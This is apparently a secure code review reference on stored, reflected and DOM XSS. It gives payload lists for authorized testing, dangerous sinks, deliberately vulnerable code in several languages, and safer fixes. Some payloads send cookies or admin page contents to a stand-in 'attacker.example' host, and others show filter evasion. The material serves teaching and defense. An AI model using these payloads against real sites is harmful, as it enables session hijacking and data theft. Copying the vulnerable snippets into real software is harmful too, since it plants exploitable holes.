---
title: "4.1 Code Reference — Review XSS"
description: >
  Payloads, sinks, multi-language examples, and fixes for Review XSS.
---

# 4.1 Code Reference — Review XSS

## Stored XSS {: #stored }

From former `4-01-review-stored-xss.md`. **Guiding chapter section:** [4.1 - Review XSS § Stored XSS](../../4-01-review-xss.md#stored).

# 4.1 Code Reference — Review Stored XSS

## Attack Payloads

Use these in authorized tests when user input is persisted and later rendered in HTML. Confirm the output context (element body, attribute, script block, URL) before relying on a single payload.

### Pattern 1: Basic script tag (HTML body context)

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Pattern 2: Event handlers without script tags

```html
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

### Pattern 3: Attribute breakout (when value is quoted)

```html
"><script>alert(1)</script>
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
```

### Pattern 4: JavaScript URL and data URIs

```html
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
```

### Pattern 5: Filter evasion and encoding variants

```html
<ScRiPt>alert(1)</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=&#97;lert(1)>
```

### Pattern 6: Stored payloads targeting privileged views

```html
<script>fetch('/admin/users').then(r=>r.text()).then(t=>fetch('https://attacker.example/?d='+btoa(t)))</script>
<img src=x onerror="new Image().src='https://attacker.example/?c='+document.cookie">
```

## Language-Specific Sinks and Dangerous APIs

Search for these patterns on every read path from persistence to HTML output. Any API that marks user data as safe HTML or disables auto-escaping is a review priority.

### Python (Flask / Jinja2)

```python
return render_template_string(ticket_body)
return Markup(review_text)
return render_template("reviews.html", summary=summary | safe)
env = Environment(autoescape=False)
Template(user_notification_tpl).render()
```

### Java (JSP / servlets)

```jsp
<%= request.getAttribute("comment") %>
<c:out value="${comment}" escapeXml="false"/>
<div>${userBio}</div>
response.getWriter().write(storedNote);
```

### C# (ASP.NET / Razor)

```csharp
@Html.Raw(Model.UserBio)
return Content(storedHtml, "text/html");
writer.Write(storedComment);  // no encoding
```

### JavaScript (SPA / Node rendering)

```javascript
element.innerHTML = ticket.message;
document.write(review.summary);
$('#review-body').html(storedRating);
dangerouslySetInnerHTML={{ __html: note.content }}
```

### HTML (email and static builders)

```html
<!-- Server builds HTML email with unencoded stored name -->
<p>Hello, <!-- USER_NAME inserted raw --></p>
<td>{{stored_cell_value}}</td>  <!-- template without escape -->
```

### Go (html/template misuse)

```go
template.HTML(storedBio)  // bypasses auto-escape
fmt.Fprintf(w, "<p>%s</p>", storedComment)  // raw write
```

## Vulnerable Examples in Other Languages

### Java

```java
@PostMapping("/reviews")
public String submitReview(@RequestParam String productId, @RequestParam String text) {
    reviewRepo.save(new ProductReview(productId, text, currentUser()));
    return "redirect:/reviews/" + productId;
}

@GetMapping("/reviews/{productId}")
public String productReviews(@PathVariable String productId, Model model) {
    model.addAttribute("reviews", reviewRepo.findByProductId(productId));
    return "product-reviews"; // JSP: ${review.text} without <c:out>
}
```

### C#

```csharp
[HttpPost("announcements")]
public IActionResult PostAnnouncement(string title, string message) {
    _db.Announcements.Add(new Announcement { Title = title, Body = message });
    _db.SaveChanges();
    return RedirectToAction("Feed");
}

public IActionResult Feed() {
    var items = _db.Announcements.OrderByDescending(a => a.PostedAt).Take(10).ToList();
    ViewBag.FeedHtml = string.Join("", items.Select(a => $"<article><h3>{a.Title}</h3><p>{a.Body}</p></article>"));
    return View();
}
```

### JavaScript

```javascript
// Stored product review returned from API; SPA renders without encoding
async function submitReview(productId, text) {
  await fetch(`/api/products/${productId}/reviews`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ text }),
  });
}

function renderReviews(reviews) {
  const container = document.getElementById("review-list");
  reviews.forEach((r) => {
    container.innerHTML += `<div class="review">${r.text}</div>`; // persisted payload executes here
  });
}
```

### HTML

```html
<!-- Thymeleaf: stored announcement rendered as raw HTML -->
<div class="announcement" th:utext="${announcement.body}"></div>

<!-- JSP without JSTL escape -->
<c:forEach var="review" items="${reviews}">
  <blockquote class="review">${review.text}</blockquote>
</c:forEach>
```

### Go

```go
func postReview(w http.ResponseWriter, r *http.Request) {
    text := r.FormValue("text")
    productID := r.FormValue("product_id")
    db.Exec("INSERT INTO reviews (product_id, text) VALUES (?, ?)", productID, text)
    http.Redirect(w, r, "/products/"+productID, http.StatusSeeOther)
}

func listReviews(w http.ResponseWriter, r *http.Request) {
    productID := r.URL.Query().Get("id")
    rows, _ := db.Query("SELECT text FROM reviews WHERE product_id = ?", productID)
    for rows.Next() {
        var text string
        rows.Scan(&text)
        fmt.Fprintf(w, "<blockquote>%s</blockquote>", text) // no html.EscapeString / template
    }
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Use templates with auto-escaping enabled. Never mark user content safe unless a vetted sanitizer produced it.

```python
from flask import Flask, render_template
from markupsafe import escape

app = Flask(__name__)
app.jinja_env.autoescape = True  # default in Flask for .html

@app.route("/support/tickets")
def list_tickets():
    rows = db.execute("SELECT subject, body FROM tickets ORDER BY created_at DESC").fetchall()
    return render_template("tickets.html", tickets=rows)

# Manual encoding when building non-template fragments:
safe_body = escape(row["body"])
```

**Important:** `|safe` in Jinja2 disables escaping. Use only for trusted, server-generated HTML. For rich text, sanitize with an allowlist library before optional `|safe`.

```python
import bleach

ALLOWED_TAGS = ["b", "i", "p", "a"]
ALLOWED_ATTRS = {"a": ["href", "title"]}
clean_body = bleach.clean(ticket_body, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)
```

### Java

Encode at the HTML sink. Prefer JSTL or OWASP Encoder over regex-only input filters.

```jsp
<%@ taglib prefix="c" uri="jakarta.tags.core" %>
<p>Review: <c:out value="${review.text}" /></p>
```

```java
import org.owasp.encoder.Encode;

String safe = Encode.forHtml(review.getText());
model.addAttribute("safeReview", safe);
```

**Important:** Thymeleaf `th:utext` and unescaped JSP scriptlets bypass default protections. Use `th:text` for untrusted data.

### C#

Razor encodes by default. Avoid `Html.Raw` on persisted fields.

```cshtml
@* Safe default encoding *@
<article><h3>@announcement.Title</h3><p>@announcement.Body</p></article>
```

```csharp
using System.Net;

var encoded = WebUtility.HtmlEncode(announcement.Body);
ViewBag.SafeBody = $"<p>{encoded}</p>";
```

For controlled HTML subsets, use a maintained sanitizer such as [HtmlSanitizer](https://github.com/mganss/HtmlSanitizer) with an explicit policy.

### Go

Use `html/template`, not `text/template`, for HTML responses.

```go
import "html/template"

var reviewTmpl = template.Must(template.New("review").Parse(
    `<blockquote class="review">{{.Text}}</blockquote>`))

func showReview(w http.ResponseWriter, text string) {
    reviewTmpl.Execute(w, struct{ Text string }{Text: text})
}
```

**Important:** `html.EscapeString` helps only when you must build strings manually; templates apply context-aware rules automatically.

## Reflected XSS {: #reflected }

From former `4-02-review-reflected-xss.md`. **Guiding chapter section:** [4.1 - Review XSS § Reflected XSS](../../4-01-review-xss.md#reflected).

# 4.2 Code Reference — Review Reflected XSS

## Attack Payloads

Use these in authorized tests when request parameters are echoed in the immediate HTML response. Craft full URLs for phishing simulations; replace `PAYLOAD` with the value for the vulnerable parameter.

### Pattern 1: Query parameter script injection

```text
/login?error=<script>alert(document.domain)</script>
/reset?msg=<img src=x onerror=alert(1)>
/oauth/callback?state=<svg/onload=alert(1)>
```

### Pattern 2: Attribute context breakout

```text
?next="><script>alert(1)</script>
?return_url=javascript:alert(1)
?style=' onmouseover='alert(1)
```

### Pattern 3: Path or fragment reflection

```text
/404?uri=</title><script>alert(1)</script>
/help/<script>alert(1)</script>
```

### Pattern 4: Header or cookie echo

```text
Referer: https://evil.example/<script>alert(1)</script>
Cookie: locale=<img src=x onerror=alert(1)>
```

### Pattern 5: Filter bypass variants

```text
?error=<ScRiPt>alert(1)</ScRiPt>
?msg=<img src=x onerror=&#97;lert(1)>
?hint=<svg><script>alert&#40;1&#41;
```

### Pattern 6: DOM-based follow-on (when reflection lands in JS)

See [4.3 Review DOM XSS](../../4-01-review-xss.md#dom) for client-side sources and sinks. Quick test strings when server output is parsed in the browser:

```text
?token=';alert(1)//
?nonce=</script><script>alert(1)</script>
?jsonp=alert(1)//  (JSONP-style sinks)
```

## Language-Specific Sinks and Dangerous APIs

Reflected XSS sinks appear wherever request data is written into HTML in the same handler. Trace each parameter to these APIs.

### Python (Flask / Jinja2)

```python
return f"<p class='error'>{request.args['error']}</p>"
return render_template_string(f"<div>{reset_msg}</div>")
return Markup(request.args.get("msg", ""))
```

### Java (JSP / servlets)

```jsp
Login failed: <%= request.getParameter("error") %>
<c:out value="${param.reason}" escapeXml="false"/>
out.println("Reset link sent to " + request.getParameter("email"));
```

### C# (ASP.NET / Razor)

```csharp
return Content($"<p>OAuth error: {Request.Query["error_description"]}</p>", "text/html");
@Html.Raw(Request.Query["msg"])
Response.Write(Request["failure_reason"]);
```

### JavaScript (Node / Express)

```javascript
res.send(`<p>Invalid token: ${req.query.token}</p>`);
document.title = location.hash.slice(1);
res.render("error", { detail: req.query.detail, autoEscape: false });
```

### HTML (error pages and static responses)

```html
<p>Password reset failed: <!-- reflected error param inserted without encoding --></p>
<meta http-equiv="refresh" content="0;url=REFLECTED_RETURN_URL">
```

### Go

```go
fmt.Fprintf(w, "<p>Login error: %s</p>", r.URL.Query().Get("error"))
template.HTML(reflectedMessage)  // disables escaping
```

## Vulnerable Examples in Other Languages

### Java

```java
@Override
protected void doGet(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
    String reason = request.getParameter("reason");
    request.setAttribute("failureReason", reason);
    request.getRequestDispatcher("/login.jsp").forward(request, response);
}
// login.jsp: <p class="error"><%= request.getAttribute("failureReason") %></p>
```

### C#

```csharp
public IActionResult ResetPassword(string token, string msg)
{
    ViewBag.StatusMessage = $"Reset failed: {msg}";
    return View();
}
// ResetPassword.cshtml: @Html.Raw(ViewBag.StatusMessage)
```

### JavaScript

```javascript
// Reflected OAuth error parameter written into the DOM
const err = new URLSearchParams(location.search).get("error_description") || "";
document.getElementById("oauth-error").innerHTML = `Authorization failed: ${err}`;
```

### HTML

```html
<!-- JSP echoes password-reset message without encoding -->
<p><%= request.getParameter("msg") %></p>

<!-- 404 handler reflects requested URI -->
<div class="not-found">Page not found: <%= request.getAttribute("uri") %></div>
```

### Go

```go
func loginError(w http.ResponseWriter, r *http.Request) {
    errMsg := r.URL.Query().Get("error")
    tmpl := `<html><body><h1>Login</h1><p class="alert">{{.Error}}</p></body></html>`
    t := template.Must(template.New("login").Parse(tmpl))
    t.Execute(w, map[string]string{"Error": errMsg}) // text/template, not html/template
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Use templates with auto-escaping enabled. Never pass reflected input through `Markup()` or `|safe`.

```python
from flask import Flask, render_template, request
from markupsafe import escape

app = Flask(__name__)

@app.route("/login")
def login_error():
    error = request.args.get("error", "")
    return render_template("login.html", error=error)

# Manual encoding when building non-template fragments:
safe_error = escape(error)
```

**Important:** `render_template_string` with user-influenced template text is both reflected XSS and SSTI risk. Use static template files and pass data as variables.

```python
# Validate format when the parameter has a fixed shape (defense in depth):
import re
if not re.fullmatch(r"[a-zA-Z0-9\s.,!?-]{1,128}", error):
    error = ""
```

### Java

Encode at the HTML sink. Prefer JSTL or OWASP Encoder over regex-only input filters.

```jsp
<%@ taglib prefix="c" uri="jakarta.tags.core" %>
<p>Login failed: <c:out value="${failureReason}" /></p>
```

```java
import org.owasp.encoder.Encode;

String safe = Encode.forHtml(request.getParameter("error"));
model.addAttribute("safeError", safe);
```

**Important:** Thymeleaf `th:utext` and unescaped JSP scriptlets bypass default protections. Use `th:text` for reflected request data.

### C#

Razor encodes by default. Avoid `Html.Raw` on request-derived strings.

```cshtml
@* Safe default encoding *@
<p class="alert">@Model.ErrorMessage</p>
```

```csharp
using System.Net;

var encoded = WebUtility.HtmlEncode(msg);
ViewBag.SafeMessage = $"Reset failed: {encoded}";
```

For controlled HTML subsets in reflected content, use a maintained sanitizer with an explicit policy.

### Go

Use `html/template`, not `text/template`, for HTML responses.

```go
import "html/template"

var loginTmpl = template.Must(template.New("login").Parse(
    `<h1>Sign in</h1><p class="alert">{{.Error}}</p>`))

func loginError(w http.ResponseWriter, r *http.Request) {
    errMsg := r.URL.Query().Get("error")
    loginTmpl.Execute(w, struct{ Error string }{Error: errMsg})
}
```

**Important:** `html.EscapeString` helps only when you must build strings manually; templates apply context-aware rules automatically.

## DOM XSS {: #dom }

From former `4-03-review-dom-xss.md`. **Guiding chapter section:** [4.1 - Review XSS § DOM XSS](../../4-01-review-xss.md#dom).

# 4.3 Code Reference — Review DOM XSS

## Attack Payloads

Use these in authorized tests when client code reads URL or message data into DOM or JS sinks. Adjust for hash vs query vs `postMessage` delivery.

### Pattern 1: Fragment (`location.hash`) injection

```text
https://app.example/welcome#bio=<img src=x onerror=alert(1)>
https://app.example/dashboard#name=<svg/onload=alert(1)>
```

### Pattern 2: Query string read by client script

```text
https://app.example/oauth/callback?error_description=<script>alert(1)</script>
https://app.example/search?q=<img src=x onerror=alert(1)>
```

### Pattern 3: JavaScript string breakout (when sink is `eval` or inline script assignment)

```text
#token=';alert(1)//
?json='-alert(1)-'
?name=</script><script>alert(1)</script>
```

### Pattern 4: `postMessage` and storage replay

```javascript
// Authorized test in console on target origin
window.postMessage('<img src=x onerror=alert(1)>', '*');
localStorage.setItem('displayName', '<svg/onload=alert(1)>');
```

### Pattern 5: `javascript:` and navigation sinks

```text
#redirect=javascript:alert(document.domain)
?next=javascript:fetch('https://attacker.example/?c='+document.cookie)
```

### Pattern 6: Filter evasion

```html
<img src=x onerror=alert&#40;1&#41;>
<svg/onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

## Language-Specific Sinks and Dangerous APIs

DOM XSS review is dominated by **JavaScript** and **HTML with embedded script**. Search client bundles, inline `<script>` blocks, and template directives.

### JavaScript (browser)

```javascript
document.getElementById("out").innerHTML = location.hash.slice(1);
document.write(decodeURIComponent(location.search.slice(1)));
eval("handleRedirect('" + params.get("next") + "')");
setTimeout("showBanner('" + userMsg + "')", 0);
element.outerHTML = incomingHtml;
location.href = redirectParam;
$(container).html(storedSnippet);
```

### HTML (inline script and templates)

```html
<script>
  const err = new URLSearchParams(location.search).get("error");
  document.getElementById("msg").innerHTML = err;
</script>

<div id="preview" th:utext="${staticShellOnly}"></div>
<!-- Vue/React mount: v-html / dangerouslySetInnerHTML bound to client-fetched JSON -->
```

### Python (serving vulnerable client shells)

Python often **hosts** the page rather than performing the sink. Flag routes that embed request data into inline script or disable CSP.

```python
return f"""<script>var q = '{request.args.get("q")}';</script>"""
return render_template("app_shell.html")  # review bundled JS for DOM sinks
```

### Java / C# (SPA hosts and Razor/Thymeleaf shells)

```java
// JSP or template passes nothing server-side; static bundle reads location.hash — review .js assets
model.addAttribute("bootConfigJson", userJson); // if rendered unescaped into <script> block
```

```csharp
// Razor: bootstrapping SPA with unencoded JSON in script tag
<script>window.__INITIAL_STATE__ = @Html.Raw(Model.ClientJson);</script>
```

### Go (static file server + template)

```go
// html/template is safe for HTML body; unsafe if template injects into <script> without json.Marshal
fmt.Fprintf(w, `<script>var ref = "%s";</script>`, r.URL.Query().Get("ref"))
```

## Vulnerable Examples in Other Languages

### Java

```java
// Boot page includes script that reads query string on client — audit static resources under /js/
// Server-side anti-pattern: embedding request param in script literal
String script = "<script>var err='" + request.getParameter("err") + "';</script>";
response.getWriter().write(script);
```

### C#

```csharp
// Razor bootstraps client error display from query without encoding in JS context
@Html.Raw($"<script>document.getElementById('e').innerHTML = '{Request.Query["msg"]}';</script>")
```

### JavaScript

```javascript
window.addEventListener("message", (event) => {
  // Missing strict origin check; writes untrusted HTML
  document.getElementById("widget").innerHTML = event.data.html;
});

function renderHighlight(term) {
  const q = new URLSearchParams(location.search).get("q");
  results.innerHTML = `<mark>${q}</mark> ${term}`; // q from URL
}
```

### HTML

```html
<!DOCTYPE html>
<html>
<body>
  <div id="status"></div>
  <script>
    const status = localStorage.getItem("lastStatus") || "";
    document.getElementById("status").innerHTML = status;
  </script>
</body>
</html>
```

### Go

```go
func bootPage(w http.ResponseWriter, r *http.Request) {
    ref := r.URL.Query().Get("ref")
    // Injecting into script/HTML without encoding — often paired with client-side use
    fmt.Fprintf(w, `<html><body><script>window.__ref="%s";</script></body></html>`, ref)
}
```

## Fix: Safer Patterns and Libraries to Use

### JavaScript

Prefer text APIs and framework-default escaping. Never assign URL or message data to `innerHTML`.

```javascript
const params = new URLSearchParams(location.hash.slice(1));
const bio = params.get("bio") || "";
const el = document.getElementById("bio");
el.textContent = bio; // safe for HTML body text display

// Or build nodes explicitly:
const span = document.createElement("span");
span.textContent = bio;
el.replaceChildren(span);
```

**Important:** When you must render a subset of HTML, use a maintained allowlist sanitizer (for example DOMPurify) and still avoid passing URL fragments directly without validation.

```javascript
import DOMPurify from "dompurify";
el.innerHTML = DOMPurify.sanitize(bio, { ALLOWED_TAGS: ["b", "i", "p"] });
```

For `postMessage`, verify origin strictly and treat payload as data, not HTML.

```javascript
window.addEventListener("message", (event) => {
  if (event.origin !== "https://trusted.example") return;
  document.getElementById("widget").textContent = String(event.data.text ?? "");
});
```

### HTML / SPA frameworks

Use default text bindings; avoid HTML bindings for untrusted data.

```jsx
// React — safe default
<div>{bio}</div>

// Only with sanitized HTML:
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(bio) }} />
```

```html
<!-- Vue — prefer {{ bio }} over v-html for user content -->
<p>{{ bio }}</p>
```

### Python

Do not embed request parameters in inline script literals. Serve static shells with strict CSP and review bundled JS.

```python
@app.route("/welcome")
def welcome():
    return render_template("welcome.html")  # no inline interpolation of request params
```

Pass initial state as JSON with `json.dumps` and `application/json` script type, or use a dedicated API—never raw string concat into `<script>`.

```python
import json
from markupsafe import Markup

safe_json = Markup(json.dumps({"bio": ""}))  # server-controlled only
return render_template("welcome.html", boot=safe_json)
```

**Important:** `json.dumps` for `<script type="application/json">` blocks is for **server-controlled** data. Client-side code must still avoid writing URL-derived data to DOM sinks.

### Java / C#

Avoid `Html.Raw` / unescaped script bootstrapping of request data. Use encoded JSON blobs and parse with `JSON.parse` on static structure, or keep error text in the HTML body via normal encoding (`th:text`, Razor `@Model.Msg`).

### Go

Use `html/template` for HTML and `json.Marshal` for script bootstrap data—never `fmt.Fprintf` of query params into `<script>`.

